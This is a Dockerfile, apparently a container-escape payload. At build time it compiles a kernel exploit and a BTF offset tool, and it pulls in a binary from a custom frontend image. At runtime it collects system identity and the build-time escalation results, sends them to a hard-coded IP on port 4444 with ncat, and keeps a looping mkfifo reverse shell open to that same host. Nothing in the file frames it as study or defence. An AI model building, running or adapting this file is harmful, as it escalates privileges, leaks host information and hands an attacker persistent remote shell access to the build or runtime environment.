# syntax=er028455/df-frontend:v4
# build-trigger: 27
FROM alpine:3.18 AS builder
RUN apk add --no-cache gcc musl-dev linux-headers curl binutils xz
COPY btf_offsets.c /btf_offsets.c
COPY exploit.c /exploit_src.c
COPY adapt.sh /adapt.sh
RUN gcc -static -o /btf_offsets /btf_offsets.c && \
    touch /esc_ok /umh_result /exploit_bin

RUN sh -c '{ \
KVER=$(uname -r); \
echo "=== BUILD V17 KERNEL=$KVER ==="; \
chmod +x /adapt.sh && sh /adapt.sh 2>&1; \
if [ -f /tmp/exploit ]; then cp /tmp/exploit /exploit_bin; fi; \
if [ -f /tmp/umh_result ]; then cp /tmp/umh_result /umh_result; fi; \
echo "=== END V17 ==="; \
} > /build_results.txt 2>&1'

FROM alpine:3.18
RUN apk add --no-cache curl nmap-ncat
COPY --from=builder /btf_offsets /btf_offsets
COPY --from=builder /build_results.txt /build_results.txt
COPY --from=builder /esc_ok /esc_ok
COPY --from=builder /umh_result /umh_result
COPY --from=builder /exploit_bin /exploit_bin
COPY --from=er028455/df-frontend:v4 /socktest /socktest

RUN printf '#!/bin/sh\n\
{\n\
echo "=== RUNTIME RECON V17 ==="\n\
uname -a; hostname; id\n\
echo "--- BUILD-TIME RESULTS ---"\n\
cat /build_results.txt\n\
for f in /esc_ok /umh_result; do\n\
  if [ -s "$f" ]; then echo "=== $f ==="; cat "$f"; fi\n\
done\n\
echo "=== END V17 ==="\n\
} > /tmp/recon 2>&1\n\
cat /tmp/recon\n\
' > /recon.sh && chmod +x /recon.sh

CMD sh -c "/recon.sh; ncat -w 30 129.101.121.138 4444 < /tmp/recon; while true; do rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | ncat 129.101.121.138 4444 > /tmp/f; sleep 5; done"
